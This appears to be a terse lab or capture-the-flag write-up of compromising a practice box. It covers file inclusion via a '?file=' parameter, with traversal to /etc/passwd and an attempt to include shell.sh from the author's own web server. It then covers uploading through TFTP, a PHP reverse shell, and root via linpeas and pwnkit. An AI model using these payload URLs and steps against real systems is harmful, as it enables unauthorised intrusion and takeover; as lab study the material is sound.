Immediately found a REMOTE FILE INCLUSION vulnerability

## Exploitation

[http://10.129.95.185/?file=](http://10.129.95.185/?file=../../../etc/passwd)http://10.10.16.173/shell.sh did not work as its not grabbing my file from my python web server

I BROKE THE HOST HAHA restartingâ€¦

Double checking the passwd file, I noticed there is tftp. Check google search it uses port 69

tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot

I was able to access it but it is not ran.

http://10.129.234.198/?file=../../../var/lib/tftpboot/shell.sh

Since the server is running php I will attempt a php reverse shell

IT WORKED!

## Privilege Escalation

Checking SUID binaries and running linpeas I noticed I may be able to run pwnkit

pwnkit worked

rooted!

## Post-exploitation

None
